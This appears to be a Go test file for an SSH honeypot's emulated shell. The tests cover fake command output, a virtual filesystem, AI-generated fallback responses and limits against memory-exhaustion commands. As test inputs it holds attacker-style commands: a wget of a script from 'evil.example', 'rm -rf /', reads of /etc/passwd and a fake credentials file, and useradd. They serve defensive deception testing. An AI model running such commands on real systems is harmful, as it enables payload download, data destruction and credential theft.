package cmd

import (
	"strings"
	"testing"

	"git.pi.mmxx.fun/tool/ssh-honeypot-go/internal/shell"
	"git.pi.mmxx.fun/tool/ssh-honeypot-go/internal/vfs"
)

// newProcessor 构造关闭延迟模拟的命令解释器，避免测试等待。
func newProcessor() *Processor {
	p := New(nil, "svr01")
	p.latency = false
	return p
}

func newSession() *shell.Session {
	return shell.NewSession("s1", "203.0.113.9", "root", vfs.New("svr01"), "svr01")
}

func TestExecuteBasics(t *testing.T) {
	p := newProcessor()
	st := newSession()

	if out := p.Execute(st, "   "); out.Text != "" || out.Exit {
		t.Fatalf("空输入应无输出: %+v", out)
	}
	if out := p.Execute(st, "exit"); !out.Exit {
		t.Fatalf("exit 应结束会话: %+v", out)
	}
	if out := p.Execute(st, "logout"); !out.Exit {
		t.Fatalf("logout 应结束会话: %+v", out)
	}
	if out := p.Execute(st, "whoami"); out.Exit || out.Text != "root\n" {
		t.Fatalf("whoami 输出不符: %+v", out)
	}
	if out := p.Execute(st, "nosuchcmd"); out.Text != "-bash: nosuchcmd: command not found\n" {
		t.Fatalf("未知命令输出不符: %+v", out)
	}
	// 命令序列：遇 exit 提前结束
	if out := p.Execute(st, "foo; exit"); !out.Exit {
		t.Fatalf("序列中的 exit 应结束会话: %+v", out)
	}
	// 历史记录的是整行输入
	if len(st.History) != 5 || st.History[4] != "foo; exit" {
		t.Fatalf("命令历史不符: %v", st.History)
	}
}

func TestExecuteSudoAndPipe(t *testing.T) {
	p := newProcessor()
	st := newSession()

	// sudo 前缀剥掉后按内层命令处理
	if out := p.Execute(st, "sudo whoami"); out.Text != "root\n" {
		t.Fatalf("sudo 前缀未剥离: %+v", out)
	}
	if out := p.Execute(st, "sudo"); !strings.Contains(out.Text, "usage: sudo") {
		t.Fatalf("空 sudo 应提示用法: %+v", out)
	}
	// 管道：只执行第一个命令
	out := p.Execute(st, "whoami | grep root")
	if strings.Contains(out.Text, "grep") || out.Text != "root\n" {
		t.Fatalf("管道后的命令不应执行: %+v", out)
	}
}

func TestExecuteRedirect(t *testing.T) {
	p := newProcessor()
	st := newSession()

	if out := p.Execute(st, "echo hello > /root/out.txt"); out.Text != "" {
		t.Fatalf("重定向时不应有终端输出: %+v", out)
	}
	content, ok := st.FS.ReadFile("/root", "/root/out.txt")
	if !ok || content != "hello\n" {
		t.Fatalf("重定向内容不符: ok=%v content=%q", ok, content)
	}
	// 追加重定向
	p.Execute(st, "id >> /root/out.txt")
	content, _ = st.FS.ReadFile("/root", "/root/out.txt")
	if strings.Count(content, "uid=0(root)") != 1 || !strings.HasPrefix(content, "hello\n") {
		t.Fatalf("追加写入失败: %q", content)
	}
}

func TestFileCommands(t *testing.T) {
	p := newProcessor()
	st := newSession()

	if out := p.Execute(st, "pwd"); out.Text != "/root\n" {
		t.Fatalf("pwd=%q", out.Text)
	}
	// cd 到不存在的目录
	if out := p.Execute(st, "cd /nope"); !strings.Contains(out.Text, "No such file or directory") {
		t.Fatalf("cd 不存在的目录应报错: %+v", out)
	}
	if out := p.Execute(st, "cd /tmp"); out.Text != "" {
		t.Fatalf("cd 成功应无输出: %+v", out)
	}
	if out := p.Execute(st, "pwd"); out.Text != "/tmp\n" {
		t.Fatalf("cd 后 pwd=%q", out.Text)
	}
	// mkdir -p + touch + ls
	if out := p.Execute(st, "mkdir -p /tmp/a/b"); out.Text != "" {
		t.Fatalf("mkdir -p 失败: %+v", out)
	}
	if out := p.Execute(st, "touch /tmp/a/b/f1.txt"); out.Text != "" {
		t.Fatalf("touch 失败: %+v", out)
	}
	if out := p.Execute(st, "ls /tmp/a/b"); out.Text != "f1.txt\n" {
		t.Fatalf("ls 输出=%q", out.Text)
	}
	if out := p.Execute(st, "ls -l /tmp/a/b"); !strings.Contains(out.Text, "total 4") {
		t.Fatalf("ls -l 输出=%q", out.Text)
	}
	// 写入与读取
	p.Execute(st, "echo one > /tmp/a/b/f1.txt")
	if out := p.Execute(st, "cat /tmp/a/b/f1.txt"); out.Text != "one\n" {
		t.Fatalf("cat 输出=%q", out.Text)
	}
	if out := p.Execute(st, "wc -l /tmp/a/b/f1.txt"); !strings.Contains(out.Text, "/tmp/a/b/f1.txt") {
		t.Fatalf("wc 输出=%q", out.Text)
	}
	if out := p.Execute(st, "stat /tmp/a/b/f1.txt"); !strings.Contains(out.Text, "File: /tmp/a/b/f1.txt") {
		t.Fatalf("stat 输出=%q", out.Text)
	}
	if out := p.Execute(st, "du -h /tmp/a"); !strings.Contains(out.Text, "/tmp/a") {
		t.Fatalf("du 输出=%q", out.Text)
	}
	if out := p.Execute(st, "find /tmp/a"); !strings.Contains(out.Text, "/tmp/a/b/f1.txt") {
		t.Fatalf("find 输出=%q", out.Text)
	}
	if out := p.Execute(st, "grep one /tmp/a/b/f1.txt"); out.Text != "one\n" {
		t.Fatalf("grep 输出=%q", out.Text)
	}
	if out := p.Execute(st, "grep -c one /tmp/a/b/f1.txt"); strings.TrimSpace(out.Text) != "1" {
		t.Fatalf("grep -c 输出=%q", out.Text)
	}
	// 删除
	if out := p.Execute(st, "rm /tmp/a/b/f1.txt"); out.Text != "" {
		t.Fatalf("rm 失败: %+v", out)
	}
	if out := p.Execute(st, "cat /tmp/a/b/f1.txt"); !strings.Contains(out.Text, "No such file or directory") {
		t.Fatalf("删除后 cat 应报错: %+v", out)
	}
	// 目录不能直接 rm
	if out := p.Execute(st, "rm /tmp/a"); !strings.Contains(out.Text, "Is a directory") {
		t.Fatalf("rm 目录应报错: %+v", out)
	}
	// 系统固定文件树可读
	if out := p.Execute(st, "cat /etc/passwd"); !strings.Contains(out.Text, "root:x:0:0") {
		t.Fatalf("cat /etc/passwd=%q", out.Text)
	}
	if out := p.Execute(st, "cat /root/.my.cnf"); !strings.Contains(out.Text, "Pr0d#Mysql!2024") {
		t.Fatalf("cat /root/.my.cnf=%q", out.Text)
	}
}

func TestSystemCommands(t *testing.T) {
	p := newProcessor()
	st := newSession()

	cases := map[string]string{
		"id":                 "uid=0(root)",
		"uname -a":           "Linux svr01",
		"hostname":           "svr01",
		"ps aux":             "USER",
		"free":               "Mem:",
		"df -h":              "/dev/sda1",
		"env":                "SHELL=/bin/bash",
		"lscpu":              "Architecture:",
		"uptime":             "load average",
		"vmstat":             "procs",
		"date":               "UTC",
		"nproc":              "4",
		"lsblk":              "MOUNTPOINT",
		"lsof":               "COMMAND",
		"systemctl":          "",
		"getent passwd root": "root:x:0:0",
	}
	for cmdline, want := range cases {
		out := p.Execute(st, cmdline)
		if !strings.Contains(out.Text, want) {
			t.Fatalf("%q 输出=%q, 期望包含 %q", cmdline, out.Text, want)
		}
	}
	// date +FORMAT 走 C 风格格式串
	if out := p.Execute(st, "date +%Y-%m-%d"); !strings.Contains(out.Text, "-") || strings.Contains(out.Text, "UTC") {
		t.Fatalf("date +格式 输出=%q", out.Text)
	}
	// history 包含前面执行过的命令
	if out := p.Execute(st, "history"); !strings.Contains(out.Text, "uname -a") {
		t.Fatalf("history 输出=%q", out.Text)
	}
}

func TestNetworkCommands(t *testing.T) {
	p := newProcessor()
	st := newSession()

	wants := map[string]string{
		"ifconfig":         "eth0",
		"ip addr":          "10.23.76.15",
		"ip route":         "default via",
		"netstat -tlnp":    "LISTEN",
		"ping 8.8.8.8":     "packet loss",
		"dig example.com":  "ANSWER SECTION",
		"nslookup a.b":     "Non-authoritative answer",
		"cat /etc/hosts":   "127.0.0.1",
		"route -n":         "Kernel IP routing table",
		"arp -a":           "HWtype",
		"ssh root@1.2.3.4": "Connection timed out",
	}
	for cmdline, want := range wants {
		out := p.Execute(st, cmdline)
		if !strings.Contains(out.Text, want) {
			t.Fatalf("%q 输出=%q, 期望包含 %q", cmdline, out.Text, want)
		}
	}

	// wget：记录下载事件并落地假文件
	if out := p.Execute(st, "wget http://evil.example/x.sh"); !strings.Contains(out.Text, "Saving to") {
		t.Fatalf("wget 输出=%q", out.Text)
	}
	if _, ok := st.FS.ReadFile("/root", "/root/x.sh"); !ok {
		t.Fatal("wget 应在当前目录落地假文件")
	}
	// curl 无 URL
	if out := p.Execute(st, "curl"); !strings.Contains(out.Text, "no URL specified") {
		t.Fatalf("curl 无参输出=%q", out.Text)
	}
}

func TestDevAndPackageCommands(t *testing.T) {
	p := newProcessor()
	st := newSession()

	// 版本查询与 FakeEnv 常量同源
	if out := p.Execute(st, "node -v"); !strings.Contains(out.Text, "v20.11.0") {
		t.Fatalf("node -v=%q", out.Text)
	}
	if out := p.Execute(st, "python3 --version"); !strings.Contains(out.Text, "3.10.12") {
		t.Fatalf("python3 --version=%q", out.Text)
	}
	if out := p.Execute(st, "go version"); !strings.Contains(out.Text, "go1.21.6") {
		t.Fatalf("go version=%q", out.Text)
	}
	// 非版本查询在未启用 AI 时回空串（不报 command not found）
	if out := p.Execute(st, "git status"); out.Text != "" {
		t.Fatalf("git status 未启用 AI 时应静默: %+v", out)
	}
	if out := p.Execute(st, "docker ps"); !strings.Contains(out.Text, "CONTAINER ID") {
		t.Fatalf("docker ps=%q", out.Text)
	}
	if out := p.Execute(st, "systemctl status ssh"); !strings.Contains(out.Text, "Active: active") {
		t.Fatalf("systemctl status=%q", out.Text)
	}
	if out := p.Execute(st, "dpkg -l"); !strings.Contains(out.Text, "openssh-server") {
		t.Fatalf("dpkg -l=%q", out.Text)
	}
	if out := p.Execute(st, "apt update"); !strings.Contains(out.Text, "Reading package lists") {
		t.Fatalf("apt update=%q", out.Text)
	}
	// tar 打包落地假归档
	if out := p.Execute(st, "tar -czf /tmp/a.tgz /etc/hostname"); out.Text != "" {
		t.Fatalf("tar 打包失败: %+v", out)
	}
	if _, ok := st.FS.ReadFile("/tmp", "/tmp/a.tgz"); !ok {
		t.Fatal("tar 应在目标路径落地假归档")
	}
	// tar 解包造目录
	if out := p.Execute(st, "tar -xzf /tmp/a.tgz"); out.Text != "" {
		t.Fatalf("tar 解包失败: %+v", out)
	}
	if n := st.FS.Resolve("/tmp", "/tmp/a"); n == nil || !n.Dir {
		t.Fatal("tar 解包应创建同名目录")
	}
	// base64 编解码
	p.Execute(st, "echo hello > /tmp/hello.txt")
	if out := p.Execute(st, "base64 /tmp/hello.txt"); strings.TrimSpace(out.Text) != "aGVsbG8K" {
		t.Fatalf("base64 编码=%q", out.Text)
	}
}

func TestPrivilegeAndDangerous(t *testing.T) {
	p := newProcessor()
	st := newSession()

	// su root：记录提权并切换身份
	if out := p.Execute(st, "su root"); out.Text != "" || st.Username != "root" {
		t.Fatalf("su root 应放行: %+v username=%q", out, st.Username)
	}
	// init 6 / reboot 模拟断开
	if out := p.Execute(st, "init 6"); !out.Exit {
		t.Fatalf("init 6 应断开连接: %+v", out)
	}
	if out := p.Execute(st, "reboot"); !out.Exit {
		t.Fatalf("reboot 应断开连接: %+v", out)
	}
	// useradd 不创建但可回应
	if out := p.Execute(st, "useradd hacker"); out.Text != "" {
		t.Fatalf("useradd 应静默成功: %+v", out)
	}
	// kill 非数字 PID
	if out := p.Execute(st, "kill abc"); !strings.Contains(out.Text, "must be process") {
		t.Fatalf("kill 非法 pid 输出=%q", out.Text)
	}
	// 危险 rm 仅记录
	if out := p.Execute(st, "rm -rf /"); out.Text != "" {
		t.Fatalf("rm -rf / 应假装成功: %+v", out)
	}
	if st.FS.Resolve("/", "/etc") == nil {
		t.Fatal("rm -rf / 不应真的删除文件树")
	}
}

func TestAIFallback(t *testing.T) {
	p := newProcessor()
	st := newSession()

	// 未注入 AI：未知命令 → command not found；已安装命令 → 空串
	if out := p.Execute(st, "nmap 10.0.0.1"); out.Text != "-bash: nmap: command not found\n" {
		t.Fatalf("未知命令回退=%q", out.Text)
	}
	// 注入 AI：两者都走大模型输出
	p.SetAI(stubAI{})
	if out := p.Execute(st, "nmap 10.0.0.1"); !strings.Contains(out.Text, "AI:") {
		t.Fatalf("AI 回退未生效=%q", out.Text)
	}
	if out := p.Execute(st, "git status"); !strings.Contains(out.Text, "AI:") {
		t.Fatalf("AI 静默回退未生效=%q", out.Text)
	}
}

// stubAI 测试用大模型客户端。
type stubAI struct{}

func (stubAI) GenerateShellOutput(hostname, username, cwd string, recent []string, cmdline string) (string, bool) {
	return "AI:" + cmdline, true
}

// recordingAI 记录调用参数的大模型客户端，用于验证路由优先级。
type recordingAI struct {
	calls    []string
	recents  [][]string
	failNext bool
}

func (r *recordingAI) GenerateShellOutput(hostname, username, cwd string, recent []string, cmdline string) (string, bool) {
	r.calls = append(r.calls, cmdline)
	r.recents = append(r.recents, append([]string(nil), recent...))
	if r.failNext {
		return "", false
	}
	return "AI:" + cmdline, true
}

// TestRoutePriority 路由优先级：本地专门仿真 > 版本常量 > AI；AI 不可用时按命令类别回退。
func TestRoutePriority(t *testing.T) {
	p := newProcessor()
	st := newSession()
	fake := &recordingAI{}
	p.SetAI(fake)

	// 本地专门仿真：不调 AI
	locals := map[string]string{
		"pwd":                  "/root\n",
		"node -v":              "v20.11.0\n",
		"docker ps":            "CONTAINER ID",
		"systemctl status ssh": "Active: active",
		"apt update":           "Reading package lists",
	}
	for cmdline, want := range locals {
		if out := p.Execute(st, cmdline); !strings.Contains(out.Text, want) {
			t.Fatalf("%q 应由本地仿真处理，实际 %q", cmdline, out.Text)
		}
	}
	if len(fake.calls) != 0 {
		t.Fatalf("本地可仿真的命令不应调用 AI: %v", fake.calls)
	}

	// 已安装命令的非版本查询 / 未知命令：均交 AI，且携带最近命令作上下文
	for _, cmdline := range []string{"git status", "docker pull nginx", "./check.sh"} {
		if out := p.Execute(st, cmdline); !strings.Contains(out.Text, "AI:"+cmdline) {
			t.Fatalf("%q 应交 AI 处理，实际 %q", cmdline, out.Text)
		}
	}
	if len(fake.calls) != 3 {
		t.Fatalf("AI 调用次数=%d, 期望 3: %v", len(fake.calls), fake.calls)
	}
	// 上下文不含当前命令本身，最多 3 条
	recent := fake.recents[len(fake.recents)-1]
	if len(recent) > 3 || (len(recent) > 0 && recent[len(recent)-1] == fake.calls[len(fake.calls)-1]) {
		t.Fatalf("AI 上下文不符合预期: %v", recent)
	}

	// AI 不可用时：未知命令回 command not found，已安装命令回空串
	fake.failNext = true
	if out := p.Execute(st, "nmap 10.0.0.1"); out.Text != "-bash: nmap: command not found\n" {
		t.Fatalf("AI 不可用时未知命令应本地兼容: %q", out.Text)
	}
	if out := p.Execute(st, "git status"); out.Text != "" {
		t.Fatalf("AI 不可用时已安装命令应静默: %q", out.Text)
	}
}

// TestHeadTailLineLimit head/tail 的 -n 由攻击者控制，必须在分配前钳制到
// maxHeadLines：否则 `head -n 10000000000 /etc/passwd` 会申请上百 GB 内存，
// 导致进程被 OOM 杀掉（一条命令即可让全部协议下线）。
func TestHeadTailLineLimit(t *testing.T) {
	p := newProcessor()
	st := newSession()
	// 先落一个 200000 行的文件，验证截断确实生效
	if out := p.Execute(st, "seq 1 200000 > /tmp/big.txt"); out.Text != "" {
		t.Fatalf("准备大文件失败: %+v", out)
	}

	out := p.Execute(st, "head -n 10000000000 /tmp/big.txt")
	if n := strings.Count(out.Text, "\n"); n != maxHeadLines {
		t.Fatalf("head 行数=%d，期望钳制到 %d", n, maxHeadLines)
	}
	out = p.Execute(st, "tail -99999999999 /tmp/big.txt")
	// tail 会跳过文件末尾换行产生的空行，因此只断言「不超上限且确有输出」
	if n := strings.Count(out.Text, "\n"); n == 0 || n > maxHeadLines {
		t.Fatalf("tail 行数=%d，期望在 (0, %d] 区间内", n, maxHeadLines)
	}

	// 小文件仍按实际行数输出，不因上限而多输出
	p.Execute(st, "echo hi > /tmp/small.txt")
	if out := p.Execute(st, "head -n 10 /tmp/small.txt"); out.Text != "hi\n" {
		t.Fatalf("小文件 head 输出=%q", out.Text)
	}
}

// TestSelfAppendRedirectBounded `cat f >> f` 每次把文件自我复制一遍，
// 不加上限时几十次即可把进程内存吃光；容量上限必须让它停下来。
func TestSelfAppendRedirectBounded(t *testing.T) {
	p := newProcessor()
	st := newSession()
	if out := p.Execute(st, "seq 1 1000 > /tmp/seed.txt"); out.Text != "" {
		t.Fatalf("准备种子文件失败: %+v", out)
	}

	sizes := make([]int, 0, 32)
	for i := 0; i < 32; i++ {
		p.Execute(st, "cat /tmp/seed.txt >> /tmp/seed.txt")
		content, _ := st.FS.ReadFile(st.Cwd, "/tmp/seed.txt")
		sizes = append(sizes, len(content))
	}

	last := sizes[len(sizes)-1]
	if last >= 64<<20 {
		t.Fatalf("自我追加未被限制，文件已增长到 %d 字节", last)
	}
	// 触及上限后连续两次追加都不应再增长（后续写入被拒绝）
	if sizes[len(sizes)-2] != last {
		t.Fatalf("触及上限后仍能继续增长：%d -> %d", sizes[len(sizes)-2], last)
	}
}
